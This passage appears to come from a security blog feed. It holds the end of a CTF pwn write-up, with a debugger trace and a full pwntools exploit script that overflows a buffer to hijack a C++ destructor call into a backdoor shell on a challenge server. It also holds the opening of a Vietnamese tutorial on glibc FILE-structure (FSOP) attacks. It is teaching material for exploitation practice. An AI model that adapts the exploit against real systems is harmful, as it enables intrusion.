        rdx: 0x1
        rcx: 0x4022f1 (main+116) ◂— endbr64
</code></pre><p>Finally, we manage to control rdx register to point to the <code>backdoor()</code> function.</p>
<pre tabindex="0"><code> 0x4027d5 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+27&gt;             je     std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+44                      &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+44&gt;
 
   0x4027d7 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+29&gt;             mov    rdx, qword ptr [rax]
   0x4027da &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+32&gt;             add    rdx, 8
   0x4027de &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+36&gt;             mov    rdx, qword ptr [rdx]
   0x4027e1 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+39&gt;             mov    rdi, rax
 ► 0x4027e4 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+42&gt;             call   rdx                           &lt;backdoor()&gt;
        rdi: 0x4eb0c0 (user_canary) ◂— 0x4eb0c0
        rsi: 0x4eb0c0 (user_canary) ◂— 0x4eb0c0
        rdx: 0x402263 (backdoor()) ◂— endbr64 
        rcx: 0x4022f1 (main+116) ◂— endbr64 
 
   0x4027e6 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+44&gt;             nop    
   0x4027e7 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+45&gt;             leave  
   0x4027e8 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+46&gt;             ret    
 
   0x4027e9                                                                         nop    
   0x4027ea &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::get() const&gt;    endbr64 
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[DEBUG] Received <span style="color:#ae81ff">0x1c</span> bytes:
</span></span><span style="display:flex;"><span>    b<span style="color:#960050;background-color:#1e0010">&#39;</span>sh: <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#f92672">/</span>readflag: not found<span style="color:#960050;background-color:#1e0010">\</span>n<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>sh: <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#f92672">/</span>readflag: not found
</span></span></code></pre></div><h2 id="exploit-script">Exploit script</h2>
<blockquote>
<p>solve.py</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./a.out&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* 0x420978 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* 0x4038fc
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        c
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, gdbscript<span style="color:#f92672">=</span>cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;43.132.193.22&#39;</span>, <span style="color:#ae81ff">9999</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./a.out&#39;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000042dc10</span>
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000403090</span>
</span></span><span style="display:flex;"><span>bin_sh<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4bdd62</span>
</span></span><span style="display:flex;"><span>backdoor<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000403387</span>
</span></span><span style="display:flex;"><span>user_canary<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4f4aa0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span>p64(backdoor)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4f4aa0</span>) <span style="color:#75715e"># fake obj</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(pl<span style="color:#f92672">+</span>(<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>len(pl))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">96</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x0000000000403407</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4f4aa0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(pl)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="reference">Reference</h1>
<p><a href="https://maskray.me/blog/2020-11-08-stack-unwinding">https://maskray.me/blog/2020-11-08-stack-unwinding</a></p>
<p><a href="https://github.com/chop-project/">https://github.com/chop-project/</a></p>
<p><a href="https://www.cnblogs.com/catch/p/3604516.html">https://www.cnblogs.com/catch/p/3604516.html</a></p>
<p><a href="https://baiy.cn/doc/cpp/inside_exception.htm">https://baiy.cn/doc/cpp/inside_exception.htm</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>FILE STREAM ORIENTED PROGRAMMING</title>
      <link>https://w1n-gl0ry.github.io/posts/fsop/</link>
      <pubDate>Tue, 08 Aug 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/fsop/</guid>
      <description><![CDATA[<h1 id="file-structure">FILE STRUCTURE</h1>
<h6 id="tags-fsop-technique-pwn-hacking">tags: <code>fsop</code> <code>technique</code> <code>pwn</code> <code>hacking</code></h6>
<p>Nói về <code>FILE STRUCTURE</code> attack (FSOP), nếu là 1 người chơi <code>pwn</code> chắc hẳn mọi người cũng đã có nghe qua. Bản thân mình cũng mơ hồ về loại tấn công này, nên mình quyết định viết 1 bài research về nó.</p>
<p>Theo mình tìm hiểu, thì kỹ thuật này được <a href="https://github.com/scwuaptx">Angelboy</a> public qua bài viết <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique"> Play with FILE Structure - Yet Another Binary Exploit Technique</a>.</p>
<p>Mình bắt đầu đi vào các phần cơ bản nhất!</p>
<h3 id="1-file-operator">1. FILE OPERATOR</h3>
<p><code>FILE</code> là 1 kiểu dữ liệu được định nghĩa trong glibc và thường được dùng khi muốn mở 1 file trong ngôn ngữ lập trình C.
Tất nhiên, nó khác với khái niệm <code>File Descriptor</code> mà chúng ta thường dùng.
Mục đích của việc dùng <code>FILE</code> là để việc thao tác với các <code>file operation</code> nhanh hơn bằng cách sử dụng <code>buffer</code> để giảm thiểu số lượng syscall được gọi (_IO_syscall read, write, &hellip;.). Vấn đề này mình sẽ giải thích kĩ hơn ở các phần sau.</p>
<h3 id="2-diving-into-glibc-code">2. DIVING INTO GLIBC CODE</h3>
<p>Mình sẽ sử dụng <code>GLIBC-2.35</code> source code để tìm hiểu về <code>FILE STRUCTURE</code>.
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/FILE.h#L7">FILE</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IO_FILE FILE
</span></span></code></pre></div><p>Vậy, type <code>FILE</code> thực chất là <code>_IO_FILE</code> struct</p>
<p>Nhìn sơ qua <code>_IO_FILE</code> struct trong glibc 2.35:
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L49">_IO_FILE</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_FILE
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _flags;		<span style="color:#75715e">/* High-order word is _IO_MAGIC; rest is flags. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* The following pointers correspond to the C++ streambuf protocol. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_ptr;	<span style="color:#75715e">/* Current read pointer */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_end;	<span style="color:#75715e">/* End of get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_read_base;	<span style="color:#75715e">/* Start of putback+get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_base;	<span style="color:#75715e">/* Start of put area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_ptr;	<span style="color:#75715e">/* Current put pointer. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_write_end;	<span style="color:#75715e">/* End of put area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_base;	<span style="color:#75715e">/* Start of reserve area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_buf_end;	<span style="color:#75715e">/* End of reserve area. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* The following fields are used to support backing up and undo. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_base; <span style="color:#75715e">/* Pointer to start of non-current get area. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_backup_base;  <span style="color:#75715e">/* Pointer to first valid character of backup area */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>_IO_save_end; <span style="color:#75715e">/* Pointer to end of non-current get area. */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> _IO_marker <span style="color:#f92672">*</span>_markers;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> _IO_FILE <span style="color:#f92672">*</span>_chain;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _fileno;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> _flags2;
</span></span><span style="display:flex;"><span>  __off_t _old_offset; <span style="color:#75715e">/* This used to be _offset but it&#39;s too small.  */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* 1+column number of pbase(); 0 is unknown. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> _cur_column;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">char</span> _vtable_offset;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> _shortbuf[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  _IO_lock_t <span style="color:#f92672">*</span>_lock;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef _IO_USE_OLD_IO_FILE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span></code></pre></div><p>Nhìn thoáng qua, rất nhiều kiểu dữ liệu được khai báo trong struct.</p>
<p>Ba loại <code>FILE</code> cơ bản thường được khai báo trong chương trình (nằm trên binary và trỏ đến structure trên libc):</p>
<ul>
<li>_IO_2_1_stderr</li>
<li>_IO_2_1_stdout</li>
<li>_IO_2_1_stdin</li>
</ul>
<p>Riêng <code>stdout</code> có thể ở chế độ unbuffered, line-buffered, hoặc fully-buffered.</p>
<ul>
<li>Unbuffered - Chương trình sẽ in ra thiết bị xuất chuẩn càng sớm càng tốt (không hạn chế).</li>
<li>Line-buffered - Chương trình sẽ in ra thiết bị xuất chuẩn khi gặp kí tự new-line.</li>
<li>Fully-buffered - Chương trình sẽ in ra thiết bị xuất chuẩn khi <code>stdout buffers</code> đầy.</li>
</ul>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/stdfiles.c#L56">_IO_list-all</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_FILE_plus <span style="color:#f92672">*</span>_IO_list_all <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_IO_2_1_stderr_;
</span></span></code></pre></div><p>Glibc mặc định biến <code>_IO_list_all</code> chứa 1 linked list tất cả các type <code>FILE</code> trong binary. Mặc định <code>_IO_list_all</code> sẽ trỏ tới <code>stderr</code> đầu tiên. Các phần tử tiếp theo sẽ được truy cập qua thuộc tính <code>_chain</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p <span style="color:#f92672">&amp;</span>_IO_list_all
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">=</span> (_IO_FILE_plus <span style="color:#f92672">**</span>) <span style="color:#ae81ff">0x7ffff7dd5520</span> <span style="color:#f92672">&lt;</span>__GI__IO_list_all<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_list_all
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">=</span> (_IO_FILE_plus <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x7ffff7dd5540</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stderr_<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_2_1_stderr_.file._chain
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span> <span style="color:#f92672">=</span> (_IO_FILE <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x7ffff7dd5620</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_2_1_stdout_.file._chain
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">11</span> <span style="color:#f92672">=</span> (_IO_FILE <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x7ffff7dd48e0</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdin_<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>_chain</p>
<p><img src="https://hackmd.io/_uploads/H1GG2SVn2.png" alt="chain"></p>
<p>Đặc biệt, <code>FILE</code> còn được bao gồm trong struct <code>_IO_FILE_plus</code></p>
<p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L324">_IO_FILE_plus</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_FILE_plus
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  FILE file;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> _IO_jump_t <span style="color:#f92672">*</span>vtable;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>Glibc-2.35</code> có thêm struct <code>_IO_FILE_plus</code> là bản mở rộng của struct <code>_IO_FILE</code> vì chỉ có chứa thêm ptr <a href="https://en.wikipedia.org/wiki/Virtual_method_table">vtable</a>, và mọi <code>FILE</code> đều dùng chung 1 <code>vtable</code>. Thường mọi <code>FILE</code> (cả 3 <code>FILE</code> cơ bản cũng dùng <code>_IO_FILE_plus</code> hơn là <code>_IO_FILE</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> p _IO_2_1_stdout_
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">12</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  file <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    _flags <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">72537977</span>,
</span></span><span style="display:flex;"><span>    _IO_read_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_read_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_read_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_write_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_buf_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a3</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_buf_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd56a4</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">+</span><span style="color:#ae81ff">132</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>    _IO_save_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _IO_backup_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _IO_save_end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _markers <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _chain <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd48e0</span> <span style="color:#f92672">&lt;</span>_IO_2_1_stdin_<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _fileno <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _flags2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _old_offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _cur_column <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _vtable_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;\000&#39;</span>,
</span></span><span style="display:flex;"><span>    _shortbuf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>    _lock <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd6780</span> <span style="color:#f92672">&lt;</span>_IO_stdfile_1_lock<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _offset <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _codecvt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _wide_data <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd47a0</span> <span style="color:#f92672">&lt;</span>_IO_wide_data_1<span style="color:#f92672">&gt;</span>,
</span></span><span style="display:flex;"><span>    _freeres_list <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    _freeres_buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>,
</span></span><span style="display:flex;"><span>    __pad5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    _mode <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>    _unused2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\000&#39;</span> <span style="color:#f92672">&lt;</span>repeats <span style="color:#ae81ff">19</span> times<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  vtable <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7dd36e0</span> <span style="color:#f92672">&lt;</span>__GI__IO_file_jumps<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>vtable</code> có kiểu dữ liệu là <code>_IO_jump_t</code>
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L293">_IO_jump_t</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _IO_jump_t
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(<span style="color:#66d9ef">size_t</span>, __dummy);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(<span style="color:#66d9ef">size_t</span>, __dummy2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_finish_t, __finish);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_overflow_t, __overflow);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_underflow_t, __underflow);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_underflow_t, __uflow);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_pbackfail_t, __pbackfail);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* showmany */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_xsputn_t, __xsputn);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_xsgetn_t, __xsgetn);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_seekoff_t, __seekoff);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_seekpos_t, __seekpos);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_setbuf_t, __setbuf);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_sync_t, __sync);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_doallocate_t, __doallocate);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_read_t, __read);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_write_t, __write);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_seek_t, __seek);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_close_t, __close);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_stat_t, __stat);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_showmanyc_t, __showmanyc);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">JUMP_FIELD</span>(_IO_imbue_t, __imbue);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>Struct này chứa các con trỏ đến các phương thức IO cần thiết trong lúc xử lí file (fopen, fread, fwrite, fclose,&hellip;).</p>
<p>Ví dụ khi thực hiện mở 1 file thông qua fopen():
-&gt; Các bước open file:</p>
<ul>
<li>Malloc FILE structure</li>
<li>Gán vtable vào FILE structure</li>
<li>Khởi tạo FILE structure</li>
<li>Liên kết FILE structure vào _IO_list_all</li>
<li>Call fopen()</li>
</ul>
